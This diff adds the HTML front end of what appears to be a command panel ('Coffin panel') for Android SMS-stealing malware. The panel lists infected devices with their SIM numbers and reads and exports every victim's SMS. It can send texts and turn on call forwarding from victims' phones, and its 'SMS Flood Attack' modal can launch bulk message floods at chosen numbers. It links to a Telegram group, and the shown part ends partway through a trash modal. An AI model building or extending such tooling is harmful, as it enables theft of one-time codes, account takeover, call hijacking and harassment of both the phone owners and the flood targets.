@@ -1,0 +1,1115 @@
+<!doctype html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes" />
+        <title>Coffin panel</title>
+        <script src="https://cdn.tailwindcss.com"></script>
+        <link
+            rel="stylesheet"
+            href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
+        />
+        <style>
+            :root {
+                --bg-primary: #0a0a0a;
+                --bg-secondary: #1a1a2e;
+                --bg-tertiary: #16213e;
+                --bg-card: rgba(0, 0, 0, 0.4);
+                --bg-modal: #1a1a2e;
+                --text-primary: #f3f4f6;
+                --text-secondary: #9ca3af;
+                --border-color: #8b5cf6;
+                --hover-bg: rgba(124, 58, 237, 0.15);
+                --nav-bg: rgba(0, 0, 0, 0.6);
+                --input-bg: #1f2937;
+                --table-hover: #1f2937;
+            }
+            
+            body.light-mode {
+                --bg-primary: #f0f4f8;
+                --bg-secondary: #ffffff;
+                --bg-tertiary: #e5e9f0;
+                --bg-card: rgba(255, 255, 255, 0.9);
+                --bg-modal: #ffffff;
+                --text-primary: #1f2937;
+                --text-secondary: #6b7280;
+                --border-color: #8b5cf6;
+                --hover-bg: rgba(124, 58, 237, 0.1);
+                --nav-bg: rgba(255, 255, 255, 0.95);
+                --input-bg: #f3f4f6;
+                --table-hover: #f9fafb;
+            }
+            
+            body {
+                font-family: "Segoe UI", system-ui, sans-serif;
+                transition: all 0.3s ease;
+            }
+            
+            .gradient-bg {
+                background: linear-gradient(
+                    135deg,
+                    var(--bg-primary) 0%,
+                    var(--bg-secondary) 50%,
+                    var(--bg-tertiary) 100%
+                );
+            }
+            
+            body.light-mode .gradient-bg {
+                background: linear-gradient(
+                    135deg,
+                    #f0f4f8 0%,
+                    #e5e9f0 50%,
+                    #dce3ed 100%
+                );
+            }
+            
+            .status-online {
+                color: #00ff00;
+                animation: pulse 2s infinite;
+            }
+            .status-offline {
+                color: #ff0000;
+            }
+            @keyframes pulse {
+                0%,
+                100% {
+                    opacity: 1;
+                }
+                50% {
+                    opacity: 0.5;
+                }
+            }
+            .card-hover:hover {
+                background: var(--hover-bg);
+                transform: translateY(-2px);
+                transition: all 0.3s;
+            }
+            .modal {
+                display: none;
+                position: fixed;
+                z-index: 1000;
+                left: 0;
+                top: 0;
+                width: 100%;
+                height: 100%;
+                background: rgba(0, 0, 0, 0.9);
+            }
+            
+            body.light-mode .modal {
+                background: rgba(0, 0, 0, 0.7);
+            }
+            
+            .modal-content {
+                background: var(--bg-modal);
+                margin: 2% auto;
+                padding: 20px;
+                border: 1px solid var(--border-color);
+                width: 95%;
+                max-width: 900px;
+                max-height: 90vh;
+                overflow-y: auto;
+                border-radius: 12px;
+                color: var(--text-primary);
+            }
+            .close {
+                color: #aaa;
+                float: right;
+                font-size: 28px;
+                font-weight: bold;
+                cursor: pointer;
+            }
+            .close:hover {
+                color: var(--text-primary);
+            }
+            .tab-btn {
+                cursor: pointer;
+                padding: 10px 20px;
+                border-bottom: 3px solid transparent;
+                transition: all 0.3s;
+            }
+            .tab-btn.active {
+                border-bottom-color: #8b5cf6;
+                color: #8b5cf6;
+            }
+            .tab-content {
+                display: none;
+            }
+            .tab-content.active {
+                display: block;
+            }
+            
+            body.light-mode table tbody tr {
+                border-color: #e5e7eb !important;
+            }
+            
+            body.light-mode table tbody tr:hover {
+                background: var(--table-hover) !important;
+            }
+            
+            body.light-mode .bg-black {
+                background: var(--bg-card) !important;
+            }
+            
+            body.light-mode .bg-gray-800,
+            body.light-mode .bg-gray-900 {
+                background: var(--input-bg) !important;
+            }
+            
+            body.light-mode .text-gray-100,
+            body.light-mode .text-gray-200,
+            body.light-mode .text-white {
+                color: var(--text-primary) !important;
+            }
+            
+            body.light-mode .text-gray-400 {
+                color: var(--text-secondary) !important;
+            }
+            
+            body.light-mode nav {
+                background: var(--nav-bg) !important;
+                backdrop-filter: blur(10px);
+            }
+            
+            @media (max-width: 768px) {
+                .hide-mobile {
+                    display: none !important;
+                }
+                table {
+                    font-size: 0.75rem;
+                }
+                .modal-content {
+                    width: 98%;
+                    margin: 1% auto;
+                    padding: 15px;
+                }
+                .stats-grid {
+                    grid-template-columns: repeat(2, 1fr) !important;
+                }
+            }
+        </style>
+    </head>
+    <body class="gradient-bg text-gray-100 min-h-screen">
+        <!-- Header -->
+        <nav
+            class="bg-black bg-opacity-60 backdrop-blur-md border-b border-purple-600 p-2 md:p-3 sticky top-0 z-50"
+        >
+            <div
+                class="container mx-auto flex flex-wrap justify-between items-center"
+            >
+                <div class="flex items-center space-x-2 md:space-x-3">
+                    <i
+                        class="fas fa-satellite-dish text-xl md:text-2xl text-purple-500"
+                    ></i>
+                    <h1 class="text-base md:text-xl font-bold">𝖈𝖔𝖋𝖋𝖎𝖓 𝖕𝖆𝖓𝖊𝖑</h1>
+                </div>
+                <div class="flex items-center space-x-1 md:space-x-2">
+                    <button
+                        onclick="toggleTheme()"
+                        class="bg-indigo-600 hover:bg-indigo-700 px-2 md:px-3 py-1 md:py-2 rounded text-xs md:text-sm"
+                        id="theme-toggle"
+                        title="Toggle Dark/Light Mode"
+                    >
+                        <i class="fas fa-moon" id="theme-icon"></i>
+                    </button>
+                    <div class="relative">
+                        <button
+                            onclick="toggleDownloadMenu()"
+                            class="bg-teal-600 hover:bg-teal-700 px-2 md:px-3 py-1 md:py-2 rounded text-xs md:text-sm"
+                            title="Download Data"
+                        >
+                            <i class="fas fa-download"></i>
+                        </button>
+                        <div id="download-menu" class="hidden absolute right-0 mt-2 w-48 bg-gray-900 border border-teal-600 rounded-lg shadow-lg z-50">
+                            <button onclick="downloadDevicesData()" class="w-full text-left px-3 py-2 hover:bg-gray-800 text-xs border-b border-gray-800">
+                                <i class="fas fa-mobile-alt mr-2"></i>Devices Data
+                            </button>
+                            <button onclick="downloadAllSMS()" class="w-full text-left px-3 py-2 hover:bg-gray-800 text-xs border-b border-gray-800">
+                                <i class="fas fa-envelope mr-2"></i>All SMS
+                            </button>
+                            <button onclick="downloadActivityLogs()" class="w-full text-left px-3 py-2 hover:bg-gray-800 text-xs border-b border-gray-800">
+                                <i class="fas fa-clipboard-list mr-2"></i>Activity Logs
+                            </button>
+                            <button onclick="downloadBackups()" class="w-full text-left px-3 py-2 hover:bg-gray-800 text-xs">
+                                <i class="fas fa-database mr-2"></i>SMS Backups
+                            </button>
+                        </div>
+                    </div>
+                    <button
+                        onclick="openActivityLogs()"
+                        class="bg-cyan-600 hover:bg-cyan-700 px-2 md:px-3 py-1 md:py-2 rounded text-xs md:text-sm"
+                        title="Activity Logs"
+                    >
+                        <i class="fas fa-history"></i>
+                    </button>
+                    <button
+                        onclick="openAnalytics()"
+                        class="bg-pink-600 hover:bg-pink-700 px-2 md:px-3 py-1 md:py-2 rounded text-xs md:text-sm"
+                        title="Analytics & Charts"
+                    >
+                        <i class="fas fa-chart-line"></i>
+                    </button>
+                    <div class="relative">
+                        <button
+                            onclick="toggleNotifications()"
+                            class="bg-purple-600 hover:bg-purple-700 px-2 md:px-3 py-1 md:py-2 rounded text-xs md:text-sm relative"
+                        >
+                            <i class="fas fa-bell"></i>
+                            <span id="notification-count" class="hidden absolute -top-1 -right-1 bg-red-600 text-white text-xs px-1.5 py-0.5 rounded-full min-w-[20px] text-center">0</span>
+                        </button>
+                        <div id="notification-dropdown" class="hidden absolute right-0 mt-2 w-80 md:w-96 bg-gray-900 border border-purple-600 rounded-lg shadow-lg z-50 max-h-96 overflow-y-auto">
+                            <div class="p-3 border-b border-purple-600 flex justify-between items-center">
+                                <h3 class="text-sm font-bold text-purple-400"><i class="fas fa-envelope mr-1"></i>New SMS</h3>
+                                <button onclick="clearNotifications()" class="text-xs text-gray-400 hover:text-white">Clear All</button>
+                            </div>
+                            <div id="notification-list" class="p-2">
+                                <p class="text-xs text-gray-400 text-center py-4">No new SMS</p>
+                            </div>
+                        </div>
+                    </div>
+                    <button
+                        onclick="openFlood()"
+                        class="bg-red-600 hover:bg-red-700 px-2 md:px-3 py-1 md:py-2 rounded text-xs md:text-sm"
+                    >
+                        <i class="fas fa-bolt mr-1"></i
+                        ><span class="hidden md:inline">Flood</span>
+                    </button>
+                    <button
+                        onclick="openTools()"
+                        class="bg-yellow-600 hover:bg-yellow-700 px-2 md:px-3 py-1 md:py-2 rounded text-xs md:text-sm"
+                    >
+                        <i class="fas fa-toolbox mr-1"></i
+                        ><span class="hidden md:inline">Tools</span>
+                    </button>
+                    <button
+                        onclick="openBackups()"
+                        class="bg-green-600 hover:bg-green-700 px-2 md:px-3 py-1 md:py-2 rounded text-xs md:text-sm"
+                    >
+                        <i class="fas fa-database mr-1"></i
+                        ><span class="hidden md:inline">Backup</span>
+                    </button>
+                    <button
+                        onclick="openTrash()"
+                        class="bg-gray-600 hover:bg-gray-700 px-2 md:px-3 py-1 md:py-2 rounded text-xs md:text-sm"
+                    >
+                        <i class="fas fa-trash mr-1"></i
+                        ><span class="hidden md:inline">Trash</span>
+                    </button>
+                    <a
+                        href="https://t.me/+yH7PyGa2M18wNmVl"
+                        target="_blank"
+                        class="bg-blue-600 hover:bg-blue-700 px-2 md:px-3 py-1 md:py-2 rounded text-xs md:text-sm"
+                    >
+                        <i class="fab fa-telegram"></i>
+                    </a>
+                    <button
+                        onclick="loadDevices()"
+                        class="bg-purple-600 hover:bg-purple-700 px-2 md:px-3 py-1 md:py-2 rounded text-xs md:text-sm"
+                    >
+                        <i class="fas fa-sync-alt"></i>
+                    </button>
+                    <button
+                        onclick="logout()"
+                        class="bg-red-600 hover:bg-red-700 px-2 md:px-3 py-1 md:py-2 rounded text-xs md:text-sm"
+                    >
+                        <i class="fas fa-sign-out-alt"></i>
+                    </button>
+                </div>
+            </div>
+        </nav>
+
+        <div class="container mx-auto p-2 md:p-4">
+            <!-- Stats -->
+            <div
+                class="stats-grid grid grid-cols-2 md:grid-cols-5 gap-2 md:gap-3 mb-4"
+            >
+                <div
+                    class="bg-black bg-opacity-40 p-2 md:p-3 rounded-lg border border-green-500"
+                >
+                    <i
+                        class="fas fa-mobile-alt text-green-500 text-sm md:text-lg"
+                    ></i>
+                    <p class="text-gray-400 text-xs">Total</p>
+                    <p id="total-devices" class="text-lg md:text-xl font-bold">
+                        0
+                    </p>
+                </div>
+                <div
+                    class="bg-black bg-opacity-40 p-2 md:p-3 rounded-lg border border-blue-500"
+                >
+                    <i class="fas fa-plug text-blue-500 text-sm md:text-lg"></i>
+                    <p class="text-gray-400 text-xs">Online</p>
+                    <p id="online-devices" class="text-lg md:text-xl font-bold">
+                        0
+                    </p>
+                </div>
+                <div
+                    class="bg-black bg-opacity-40 p-2 md:p-3 rounded-lg border border-red-500"
+                >
+                    <i
+                        class="fas fa-power-off text-red-500 text-sm md:text-lg"
+                    ></i>
+                    <p class="text-gray-400 text-xs">Offline</p>
+                    <p
+                        id="offline-devices"
+                        class="text-lg md:text-xl font-bold"
+                    >
+                        0
+                    </p>
+                </div>
+                <div
+                    class="bg-black bg-opacity-40 p-2 md:p-3 rounded-lg border border-yellow-500"
+                >
+                    <i
+                        class="fas fa-envelope text-yellow-500 text-sm md:text-lg"
+                    ></i>
+                    <p class="text-gray-400 text-xs">SMS</p>
+                    <p id="total-sms" class="text-lg md:text-xl font-bold">0</p>
+                </div>
+                <div
+                    class="bg-black bg-opacity-40 p-2 md:p-3 rounded-lg border border-purple-500 cursor-pointer"
+                    onclick="showStats()"
+                >
+                    <i
+                        class="fas fa-server text-purple-500 text-sm md:text-lg"
+                    ></i>
+                    <p class="text-gray-400 text-xs">Firebase</p>
+                    <p
+                        id="firebase-status"
+                        class="text-xs md:text-sm text-green-400"
+                    >
+                        Active
+                    </p>
+                </div>
+            </div>
+
+            <!-- Category Filter Buttons -->
+            <div class="flex justify-center gap-2 mb-4 flex-wrap">
+                <button onclick="filterByCategory('all')" id="filter-all" class="bg-purple-600 px-4 py-2 rounded text-sm font-semibold">
+                    <i class="fas fa-list mr-1"></i>All Devices
+                </button>
+                <button onclick="filterByCategory('liked')" id="filter-liked" class="bg-gray-700 px-4 py-2 rounded text-sm">
+                    <i class="fas fa-heart mr-1"></i>Liked
+                </button>
+                <button onclick="filterByCategory('online')" id="filter-online" class="bg-gray-700 px-4 py-2 rounded text-sm">
+                    <i class="fas fa-circle text-green-400 mr-1"></i>Online
+                </button>
+                <button onclick="filterByCategory('offline')" id="filter-offline" class="bg-gray-700 px-4 py-2 rounded text-sm">
+                    <i class="fas fa-circle text-red-400 mr-1"></i>Offline
+                </button>
+            </div>
+
+            <!-- Liked Devices Table -->
+            <div
+                id="liked-devices-section"
+                class="bg-black bg-opacity-40 rounded-lg border border-pink-600 overflow-hidden mb-3"
+                style="display: none;"
+            >
+                <div
+                    class="p-2 md:p-3 bg-pink-900 bg-opacity-30 flex justify-between items-center"
+                >
+                    <h2 class="text-sm md:text-lg font-bold">
+                        <i class="fas fa-heart mr-2 text-pink-500"></i>Liked Devices (<span id="liked-count">0</span>)
+                    </h2>
+                </div>
+                <div class="overflow-x-auto">
+                    <table class="w-full text-xs">
+                        <thead class="bg-pink-950 bg-opacity-50">
+                            <tr>
+                                <th class="px-2 py-2 text-left">
+                                    <input
+                                        type="checkbox"
+                                        id="select-all-liked"
+                                        onchange="toggleSelectAllLiked(this)"
+                                    />
+                                </th>
+                                <th class="px-2 py-2 text-left">Status</th>
+                                <th class="px-2 py-2 text-left">Device</th>
+                                <th class="px-2 py-2 text-left hide-mobile">
+                                    Join
+                                </th>
+                                <th class="px-2 py-2 text-left">SIM 1</th>
+                                <th class="px-2 py-2 text-left hide-mobile">
+                                    SIM 2
+                                </th>
+                                <th class="px-2 py-2 text-left hide-mobile">
+                                    Battery
+                                </th>
+                                <th class="px-2 py-2 text-left">Actions</th>
+                            </tr>
+                        </thead>
+                        <tbody id="liked-devices-table"></tbody>
+                    </table>
+                </div>
+            </div>
+
+            <!-- Online Devices Table -->
+            <div
+                id="online-devices-section"
+                class="bg-black bg-opacity-40 rounded-lg border border-green-600 overflow-hidden mb-3"
+                style="display: none;"
+            >
+                <div
+                    class="p-2 md:p-3 bg-green-900 bg-opacity-30 flex justify-between items-center"
+                >
+                    <h2 class="text-sm md:text-lg font-bold">
+                        <i class="fas fa-circle text-green-400 mr-2"></i>Online Devices (<span id="online-count">0</span>)
+                    </h2>
+                </div>
+                <div class="overflow-x-auto">
+                    <table class="w-full text-xs">
+                        <thead class="bg-green-950 bg-opacity-50">
+                            <tr>
+                                <th class="px-2 py-2 text-left">
+                                    <input
+                                        type="checkbox"
+                                        id="select-all-online"
+                                        onchange="toggleSelectAllOnline(this)"
+                                    />
+                                </th>
+                                <th class="px-2 py-2 text-left">Status</th>
+                                <th class="px-2 py-2 text-left">Device</th>
+                                <th class="px-2 py-2 text-left hide-mobile">
+                                    Join
+                                </th>
+                                <th class="px-2 py-2 text-left">SIM 1</th>
+                                <th class="px-2 py-2 text-left hide-mobile">
+                                    SIM 2
+                                </th>
+                                <th class="px-2 py-2 text-left hide-mobile">
+                                    Battery
+                                </th>
+                                <th class="px-2 py-2 text-left">Actions</th>
+                            </tr>
+                        </thead>
+                        <tbody id="online-devices-table"></tbody>
+                    </table>
+                </div>
+            </div>
+
+            <!-- Offline Devices Table -->
+            <div
+                id="offline-devices-section"
+                class="bg-black bg-opacity-40 rounded-lg border border-red-600 overflow-hidden mb-3"
+                style="display: none;"
+            >
+                <div
+                    class="p-2 md:p-3 bg-red-900 bg-opacity-30 flex justify-between items-center"
+                >
+                    <h2 class="text-sm md:text-lg font-bold">
+                        <i class="fas fa-circle text-red-400 mr-2"></i>Offline Devices (<span id="offline-count">0</span>)
+                    </h2>
+                </div>
+                <div class="overflow-x-auto">
+                    <table class="w-full text-xs">
+                        <thead class="bg-red-950 bg-opacity-50">
+                            <tr>
+                                <th class="px-2 py-2 text-left">
+                                    <input
+                                        type="checkbox"
+                                        id="select-all-offline"
+                                        onchange="toggleSelectAllOffline(this)"
+                                    />
+                                </th>
+                                <th class="px-2 py-2 text-left">Status</th>
+                                <th class="px-2 py-2 text-left">Device</th>
+                                <th class="px-2 py-2 text-left hide-mobile">
+                                    Join
+                                </th>
+                                <th class="px-2 py-2 text-left">SIM 1</th>
+                                <th class="px-2 py-2 text-left hide-mobile">
+                                    SIM 2
+                                </th>
+                                <th class="px-2 py-2 text-left hide-mobile">
+                                    Battery
+                                </th>
+                                <th class="px-2 py-2 text-left">Actions</th>
+                            </tr>
+                        </thead>
+                        <tbody id="offline-devices-table"></tbody>
+                    </table>
+                </div>
+            </div>
+
+            <!-- All Devices Table -->
+            <div
+                id="all-devices-section"
+                class="bg-black bg-opacity-40 rounded-lg border border-purple-600 overflow-hidden mb-3"
+            >
+                <div
+                    class="p-2 md:p-3 bg-purple-900 bg-opacity-30 flex justify-between items-center"
+                >
+                    <h2 class="text-sm md:text-lg font-bold">
+                        <i class="fas fa-list mr-2"></i>All Devices
+                    </h2>
+                    <button
+                        onclick="selectAllDevices()"
+                        class="text-xs bg-purple-600 px-2 py-1 rounded"
+                    >
+                        <i class="fas fa-check-square mr-1"></i>Select All
+                    </button>
+                </div>
+                <!-- Search Bar -->
+                <div class="p-2 bg-opacity-20 bg-purple-800">
+                    <input
+                        type="text"
+                        id="device-search"
+                        placeholder="🔍 Search by name, ID, SIM number, or device model..."
+                        class="w-full bg-gray-800 text-white px-3 py-2 rounded border border-purple-600 text-sm"
+                        oninput="filterDevices()"
+                    />
+                </div>
+                <div class="overflow-x-auto">
+                    <table class="w-full text-xs">
+                        <thead class="bg-purple-950 bg-opacity-50">
+                            <tr>
+                                <th class="px-2 py-2 text-left">
+                                    <input
+                                        type="checkbox"
+                                        id="select-all"
+                                        onchange="toggleSelectAll(this)"
+                                    />
+                                </th>
+                                <th class="px-2 py-2 text-left">Status</th>
+                                <th class="px-2 py-2 text-left">Device</th>
+                                <th class="px-2 py-2 text-left hide-mobile">
+                                    Join
+                                </th>
+                                <th class="px-2 py-2 text-left">SIM 1</th>
+                                <th class="px-2 py-2 text-left hide-mobile">
+                                    SIM 2
+                                </th>
+                                <th class="px-2 py-2 text-left hide-mobile">
+                                    Battery
+                                </th>
+                                <th class="px-2 py-2 text-left">Actions</th>
+                            </tr>
+                        </thead>
+                        <tbody id="devices-table"></tbody>
+                    </table>
+                </div>
+            </div>
+
+            <!-- Control Panel -->
+            <div
+                id="control-panel"
+                class="hidden bg-black bg-opacity-40 rounded-lg border border-purple-600 p-2 md:p-4"
+            >
+                <div class="flex justify-between items-center mb-3">
+                    <h2 class="text-base md:text-xl font-bold">
+                        <i class="fas fa-terminal mr-2 text-purple-500"></i>
+                        <span id="device-title">Control</span>
+                    </h2>
+                    <button
+                        onclick="closePanel()"
+                        class="text-gray-400 hover:text-white"
+                    >
+                        <i class="fas fa-times text-lg"></i>
+                    </button>
+                </div>
+
+                <!-- SMS Send -->
+                <div
+                    class="bg-gray-900 bg-opacity-50 rounded-lg p-2 md:p-3 mb-3"
+                >
+                    <h3
+                        class="text-xs md:text-sm font-bold text-purple-400 mb-2"
+                    >
+                        <i class="fas fa-sms mr-1"></i>Send SMS
+                    </h3>
+                    <div class="grid grid-cols-1 md:grid-cols-4 gap-2">
+                        <select
+                            id="sms-sim"
+                            class="bg-gray-800 text-white px-2 py-2 rounded border border-purple-600 text-xs"
+                        >
+                            <option value="0">SIM 1</option>
+                            <option value="1">SIM 2</option>
+                        </select>
+                        <input
+                            id="sms-to"
+                            placeholder="To Number"
+                            class="bg-gray-800 text-white px-2 py-2 rounded border border-purple-600 text-xs"
+                        />
+                        <input
+                            id="sms-msg"
+                            placeholder="Message"
+                            class="bg-gray-800 text-white px-2 py-2 rounded border border-purple-600 text-xs"
+                        />
+                        <button
+                            onclick="sendSMS()"
+                            class="bg-green-600 hover:bg-green-700 px-3 py-2 rounded text-xs"
+                        >
+                            <i class="fas fa-paper-plane mr-1"></i>Send
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Call Forward -->
+                <div
+                    class="bg-gray-900 bg-opacity-50 rounded-lg p-2 md:p-3 mb-3"
+                >
+                    <h3
+                        class="text-xs md:text-sm font-bold text-purple-400 mb-2"
+                    >
+                        <i class="fas fa-phone-alt mr-1"></i>Call Forward
+                    </h3>
+                    <div class="grid grid-cols-1 md:grid-cols-5 gap-2">
+                        <select
+                            id="cf-sim"
+                            class="bg-gray-800 text-white px-2 py-2 rounded border border-purple-600 text-xs"
+                        >
+                            <option value="0">SIM 1</option>
+                            <option value="1">SIM 2</option>
+                        </select>
+                        <input
+                            id="cf-to"
+                            placeholder="Forward To"
+                            class="bg-gray-800 text-white px-2 py-2 rounded border border-purple-600 md:col-span-2 text-xs"
+                        />
+                        <button
+                            onclick="activateCF()"
+                            class="bg-blue-600 hover:bg-blue-700 px-3 py-2 rounded text-xs"
+                        >
+                            <i class="fas fa-toggle-on mr-1"></i>ON
+                        </button>
+                        <button
+                            onclick="deactivateCF()"
+                            class="bg-red-600 hover:bg-red-700 px-3 py-2 rounded text-xs"
+                        >
+                            <i class="fas fa-toggle-off mr-1"></i>OFF
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Messages -->
+                <div class="bg-gray-900 bg-opacity-50 rounded-lg p-2 md:p-3">
+                    <div class="flex justify-between items-center mb-2">
+                        <h3
+                            class="text-xs md:text-sm font-bold text-purple-400"
+                        >
+                            <i class="fas fa-inbox mr-1"></i>All Messages
+                        </h3>
+                    </div>
+                    <div class="text-xs text-gray-400 mb-1" id="message-count">
+                        Showing 0 of 0 messages
+                    </div>
+                    <div
+                        class="overflow-x-auto max-h-64 overflow-y-auto"
+                        id="messages-container"
+                    >
+                        <table class="w-full text-xs">
+                            <thead class="bg-gray-800 sticky top-0">
+                                <tr>
+                                    <th class="px-2 py-1 text-left">Sender</th>
+                                    <th class="px-2 py-1 text-left">Message</th>
+                                    <th class="px-2 py-1 text-left hide-mobile">
+                                        Time
+                                    </th>
+                                    <th class="px-2 py-1 text-left">Actions</th>
+                                </tr>
+                            </thead>
+                            <tbody id="messages-table"></tbody>
+                        </table>
+                    </div>
+                    <button
+                        id="load-more"
+                        onclick="loadMoreMessages()"
+                        class="mt-2 bg-purple-600 hover:bg-purple-700 px-3 py-2 rounded text-xs w-full"
+                        style="display: none;"
+                    >
+                        <i class="fas fa-chevron-down mr-1"></i>Load More
+                    </button>
+                </div>
+                
+                <!-- SMS Status Monitor -->
+                <div id="sms-status-section" class="bg-gray-900 bg-opacity-50 rounded-lg p-2 md:p-3 mt-3" style="display: none;">
+                    <h3 class="text-xs md:text-sm font-bold text-purple-400 mb-2">
+                        <i class="fas fa-paper-plane mr-1"></i>SMS Status
+                    </h3>
+                    <div id="sms-status-list" class="space-y-2 max-h-48 overflow-y-auto">
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Device Info Modal -->
+        <div id="info-modal" class="modal">
+            <div class="modal-content">
+                <span class="close" onclick="closeModal()">&times;</span>
+                <h2 class="text-xl md:text-2xl font-bold text-purple-400 mb-4">
+                    <i class="fas fa-info-circle mr-2"></i>Device Details
+                </h2>
+                <div
+                    id="device-details"
+                    class="grid grid-cols-1 md:grid-cols-2 gap-3"
+                ></div>
+            </div>
+        </div>
+
+        <!-- Flood Modal -->
+        <div id="flood-modal" class="modal">
+            <div class="modal-content">
+                <span class="close" onclick="closeFloodModal()">&times;</span>
+                <h2 class="text-xl md:text-2xl font-bold text-red-400 mb-4">
+                    <i class="fas fa-bolt mr-2"></i>SMS Flood Attack
+                </h2>
+                <div class="space-y-3">
+                    <div>
+                        <label class="text-sm text-gray-400"
+                            >Selected Devices:
+                            <span id="flood-count" class="text-green-400"
+                                >0</span
+                            ></label
+                        >
+                    </div>
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-3">
+                        <select
+                            id="flood-sim"
+                            class="bg-gray-800 text-white px-3 py-2 rounded border border-red-600"
+                        >
+                            <option value="0">SIM 1</option>
+                            <option value="1">SIM 2</option>
+                        </select>
+                        <select
+                            id="flood-input-type"
+                            class="bg-gray-800 text-white px-3 py-2 rounded border border-red-600"
+                            onchange="toggleFloodInputType()"
+                        >
+                            <option value="single">Single Number</option>
+                            <option value="multiple">Multiple Numbers</option>
+                            <option value="file">From Text File</option>
+                        </select>
+                    </div>
+                    <div id="single-number-input" class="mt-3">
+                        <input
+                            id="flood-to"
+                            placeholder="Target Number"
+                            class="w-full bg-gray-800 text-white px-3 py-2 rounded border border-red-600"
+                        />
+                    </div>
+                    <div id="multiple-numbers-input" class="mt-3 hidden">
+                        <textarea
+                            id="flood-to-multiple"
+                            placeholder="Enter multiple numbers (one per line)"
+                            class="w-full bg-gray-800 text-white px-3 py-2 rounded border border-red-600"
+                            rows="4"
+                        ></textarea>
+                    </div>
+                    <div id="file-input" class="mt-3 hidden">
+                        <input
+                            type="file"
+                            id="flood-to-file"
+                            accept=".txt"
+                            class="w-full bg-gray-800 text-white px-3 py-2 rounded border border-red-600"
+                        />
+                        <div class="flex justify-between items-center mt-2">
+                            <button
+                                onclick="downloadSampleFile()"
+                                class="bg-blue-600 hover:bg-blue-700 px-3 py-2 rounded text-xs"
+                            >
+                                <i class="fas fa-download mr-1"></i>Download Sample
+                            </button>
+                            <span class="text-xs text-gray-400">One number per line</span>
+                        </div>
+                    </div>
+                    <input
+                        id="flood-msg"
+                        placeholder="Message"
+                        class="w-full bg-gray-800 text-white px-3 py-2 rounded border border-red-600 mt-3"
+                    />
+                    <input
+                        id="flood-count-input"
+                        type="number"
+                        value="1"
+                        min="1"
+                        max="100"
+                        placeholder="SMS per device"
+                        class="w-full bg-gray-800 text-white px-3 py-2 rounded border border-red-600"
+                    />
+                    <div class="grid grid-cols-2 gap-3 mt-3">
+                        <div>
+                            <label class="text-xs text-gray-400">Delay (ms)</label>
+                            <input
+                                id="flood-delay"
+                                type="number"
+                                value="1000"
+                                min="0"
+                                max="10000"
+                                placeholder="Delay between SMS"
+                                class="w-full bg-gray-800 text-white px-3 py-2 rounded border border-red-600 text-xs mt-1"
+                            />
+                        </div>
+                        <div>
+                            <label class="text-xs text-gray-400">Random Message</label>
+                            <select
+                                id="flood-random"
+                                class="w-full bg-gray-800 text-white px-3 py-2 rounded border border-red-600 text-xs mt-1"
+                            >
+                                <option value="false">No</option>
+                                <option value="true">Yes</option>
+                            </select>
+                        </div>
+                    </div>
+                    <div class="mt-3">
+                        <label class="text-xs text-gray-400 flex items-center">
+                            <input type="checkbox" id="flood-distribute" class="mr-2">
+                            Distribute evenly across devices
+                        </label>
+                    </div>
+                    <button
+                        onclick="executeFlood()"
+                        class="w-full bg-red-600 hover:bg-red-700 px-4 py-3 rounded font-bold mt-3"
+                    >
+                        <i class="fas fa-fire mr-2"></i>LAUNCH FLOOD
+                    </button>
+                    <div id="flood-progress" class="hidden mt-3 bg-gray-800 p-3 rounded">
+                        <div class="text-xs text-gray-400 mb-2">Progress</div>
+                        <div class="w-full bg-gray-700 rounded-full h-2">
+                            <div id="flood-progress-bar" class="bg-red-600 h-2 rounded-full transition-all" style="width: 0%"></div>
+                        </div>
+                        <div class="text-xs text-gray-400 mt-2" id="flood-status">Starting...</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Tools Modal -->
+        <div id="tools-modal" class="modal">
+            <div class="modal-content">
+                <span class="close" onclick="closeToolsModal()">&times;</span>
+                <h2 class="text-xl md:text-2xl font-bold text-yellow-400 mb-4">
+                    <i class="fas fa-toolbox mr-2"></i>Tools Hub
+                </h2>
+                <div class="grid grid-cols-2 md:grid-cols-3 gap-3">
+                    <a
+                        href="https://www.shodan.io/"
+                        target="_blank"
+                        class="bg-gray-800 p-3 rounded border border-yellow-600 hover:bg-gray-700 text-center"
+                    >
+                        <i
+                            class="fas fa-search text-2xl text-yellow-500 mb-2"
+                        ></i>
+                        <p class="text-sm">Shodan</p>
+                    </a>
+                    <a
+                        href="https://crt.sh/"
+                        target="_blank"
+                        class="bg-gray-800 p-3 rounded border border-yellow-600 hover:bg-gray-700 text-center"
+                    >
+                        <i
+                            class="fas fa-certificate text-2xl text-yellow-500 mb-2"
+                        ></i>
+                        <p class="text-sm">CRT.sh</p>
+                    </a>
+                    <a
+                        href="https://ipinfo.io/"
+                        target="_blank"
+                        class="bg-gray-800 p-3 rounded border border-yellow-600 hover:bg-gray-700 text-center"
+                    >
+                        <i
+                            class="fas fa-map-marker-alt text-2xl text-yellow-500 mb-2"
+                        ></i>
+                        <p class="text-sm">IP Info</p>
+                    </a>
+                    <a
+                        href="https://www.virustotal.com/"
+                        target="_blank"
+                        class="bg-gray-800 p-3 rounded border border-yellow-600 hover:bg-gray-700 text-center"
+                    >
+                        <i
+                            class="fas fa-shield-virus text-2xl text-yellow-500 mb-2"
+                        ></i>
+                        <p class="text-sm">VirusTotal</p>
+                    </a>
+                    <a
+                        href="https://dnsdumpster.com/"
+                        target="_blank"
+                        class="bg-gray-800 p-3 rounded border border-yellow-600 hover:bg-gray-700 text-center"
+                    >
+                        <i
+                            class="fas fa-network-wired text-2xl text-yellow-500 mb-2"
+                        ></i>
+                        <p class="text-sm">DNS Dumpster</p>
+                    </a>
+                    <a
+                        href="https://www.base64decode.org/"
+                        target="_blank"
+                        class="bg-gray-800 p-3 rounded border border-yellow-600 hover:bg-gray-700 text-center"
+                    >
+                        <i
+                            class="fas fa-code text-2xl text-yellow-500 mb-2"
+                        ></i>
+                        <p class="text-sm">Base64</p>
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <!-- Trash Modal -->
+        <div id="trash-modal" class="modal">
+            <div class="modal-content">
+                <span class="close" onclick="closeTrashModal()">&times;</span>
+                <h2 class="text-xl md:text-2xl font-bold text-gray-400 mb-4">
